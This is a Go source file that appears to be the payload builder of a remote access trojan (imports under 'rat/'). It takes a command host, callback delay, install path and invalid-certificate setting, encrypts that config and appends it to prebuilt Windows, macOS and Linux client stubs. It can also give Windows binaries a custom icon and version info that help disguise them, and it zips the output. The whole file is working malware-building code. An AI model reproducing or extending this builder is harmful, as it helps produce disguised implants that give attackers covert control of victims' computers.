package build

import (
	"archive/zip"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"io"
	"io/ioutil"
	"os"
	"rat/command/log"
	"rat/shared"
	"rat/shared/crypto"
	"rat/shared/installpath"
)

// Config is received from the websocket
type Config struct {
	TargetOS    string `json:"os"`
	TargetArch  string `json:"arch"`
	Host        string `json:"host"`
	Delay       int    `json:"delay"`
	UPX         bool   `json:"upx"`
	Name        string `json:"name"`
	InstallPath int    `json:"installPath"`
	InvalidSSL  bool   `json:"invalidCertificates"`

	Manifest struct {
		Version  string `json:"version,omitempty"`
		IconData string `json:"icon,omitempty"`
	} `json:"manifest,omitempty"`
}

type file struct {
	Name string
	Path string
}

func Build(c *Config) (string, string, error) {
	log.Println("Starting build...")
	log.Println("Target OS:", c.TargetOS)
	log.Println("Target Arch:", c.TargetArch)
	//log.Println("%#v", *c)

	var oss []string
	var archs []string

	if c.TargetOS == "all" {
		oss = []string{"windows", "macos", "linux"}
	} else {
		oss = []string{c.TargetOS}
	}

	if c.TargetArch == "all" {
		archs = []string{"amd64", "386"}
	} else {
		archs = []string{c.TargetArch}
	}

	config := shared.BinaryConfig{
		Host:       c.Host,
		Delay:      c.Delay,
		Name:       c.Name,
		Install:    installpath.Path(c.InstallPath),
		InvalidSSL: c.InvalidSSL,
	}

	log.Println("Encoded config:", config)

	var options []optionpair

	if c.Manifest.IconData != "" {
		icon, err := ioutil.TempFile("", "icon")
		if err != nil {
			log.Println("icon:", err.Error())
		}

		data, err := base64.StdEncoding.DecodeString(c.Manifest.IconData)
		if err != nil {
			log.Println("icon:", err.Error())
		}

		icon.Write(data)

		icon.Close()

		options = append(options, optionpair{Icon, icon.Name()})
	}

	if c.Manifest.Version != "" {
		options = append(options, optionpair{ProductVersion, c.Manifest.Version})
	}

	var files []file

	for _, ost := range oss {
		for _, arch := range archs {
			encoded, err := json.Marshal(&config)
			if err != nil {
				return "", "", err
			}

			ext := ""
			if ost == "windows" {
				ext = ".exe"
			}
			if arch == "386" {
				arch = "x86"
			}

			bin, err := os.OpenFile("bin/"+ost+"_"+arch+ext, os.O_RDONLY, 0777)
			defer bin.Close()
			if err != nil {
				continue
			}

			temp, err := ioutil.TempFile("", "build")
			if err != nil {
				return "", "", err
			}

			binName := ost + "_" + arch + ext

			files = append(files, file{binName, temp.Name()})

			log.Println(temp.Name())

			io.Copy(temp, bin)

			stat, err := bin.Stat()
			if err != nil {
				return "", "", err
			}

			offset := int32(stat.Size()) // 32 bit integer

			log.Println("Offset:", offset)

			key := crypto.GenerateKey()
			iv := crypto.GenerateIv()

			temp.Write(crypto.Encrypt(encoded, key, iv))

			temp.Write(key)
			temp.Write(iv)
			binary.Write(temp, shared.ByteOrder, offset) // write offset as int32 (4 bytes)

			temp.Close()

			if ost == "windows" && len(options) > 0 {
				AddResources(temp.Name(), options)
			}
		}
	}

	// One file was built
	if len(files) == 1 {
		return files[0].Path, files[0].Name, nil
	}

	tz, _ := ioutil.TempFile("", "zip")
	z := zip.NewWriter(tz)

	for _, file := range files {
		f, err := z.Create(file.Name)
		if err != nil {
			panic(err)
		}
		tt, _ := os.Open(file.Path)
		_, err = io.Copy(f, tt)
		if err != nil {
			panic(err)
		}
	}

	z.Close()
	tz.Close()

	log.Println(tz.Name())

	return tz.Name(), "build.zip", nil
}
